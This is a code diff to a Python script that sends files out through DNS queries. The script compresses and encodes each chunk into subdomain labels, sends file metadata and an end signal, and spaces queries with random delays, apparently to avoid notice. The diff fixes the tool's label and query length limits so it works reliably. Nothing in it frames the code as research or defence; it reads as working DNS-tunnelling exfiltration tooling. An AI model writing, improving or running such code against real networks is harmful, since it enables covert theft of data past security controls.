@@ -38,6 +38,9 @@ def resolve_dns_server(server):
 # Function to send a DNS query with a random delay based on user input
 def send_dns_query(data, server_ip, max_delay):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    if len(data) > 253:
+        print(f"Error: DNS query exceeds the 253 character limit: {len(data)} characters.")
+        return
     sock.sendto(data.encode(), (server_ip, DNS_PORT))
     
     # Add a random delay between 0.1 seconds and the user-provided maximum delay
@@ -54,10 +57,16 @@ def send_file_chunks(file_path, resolved_ip, domain, max_delay, total_chunks):
             chunk_data = file.read(chunk_size)
             encoded_chunk_data = compress_and_encode(chunk_data)
 
-            # Break up encoded data into segments to avoid long subdomains
-            subdomains = [encoded_chunk_data[i:i+60] for i in range(0, len(encoded_chunk_data), 60)]
+            # Break up encoded data into segments to avoid long subdomains (max label size 63 chars)
+            subdomains = [encoded_chunk_data[i:i+63] for i in range(0, len(encoded_chunk_data), 63)]
             query = f"c{chunk_number}." + ".".join(subdomains) + f".{domain}"
             print(f"Sending chunk {chunk_number + 1}/{total_chunks}")
+
+            # Check total query length (should be <= 253 characters)
+            if len(query) > 253:
+                print(f"Error: Query length exceeds limit: {len(query)} characters.")
+                continue
+
             send_dns_query(query, resolved_ip, max_delay)
 
     print("All chunks have been sent successfully.")
@@ -70,12 +79,24 @@ def send_file_info(file_name, file_md5, total_chunks, resolved_ip, domain, max_d
 
     query = f"f.{encoded_file_name}.{encoded_file_md5}.{total_chunks}.{domain}"
     print(f"Sending file info: {file_name}, MD5: {file_md5}, Total Chunks: {total_chunks}")
+
+    # Check total query length (should be <= 253 characters)
+    if len(query) > 253:
+        print(f"Error: Query length exceeds limit: {len(query)} characters.")
+        return
+
     send_dns_query(query, resolved_ip, max_delay)
 
 # Function to signal end of transmission
 def send_end_signal(resolved_ip, domain, max_delay):
     # Use static "end" prefix for the end-of-transmission signal
     query = f"e.end.{domain}"
+
+    # Check total query length (should be <= 253 characters)
+    if len(query) > 253:
+        print(f"Error: Query length exceeds limit: {len(query)} characters.")
+        return
+
     print("Sending end of transmission signal")
     send_dns_query(query, resolved_ip, max_delay)
     print("File transmission complete!")
@@ -108,6 +129,7 @@ def send_file(file_path, max_delay):
     # Signal the end of transmission
     send_end_signal(resolved_ip, domain, max_delay)
 
+# Example usage
 file_path = input("Enter the file path to send (quotes allowed): ").strip()
 max_delay = float(input("Enter the maximum delay (in seconds) between queries: "))
 send_file(file_path, max_delay)
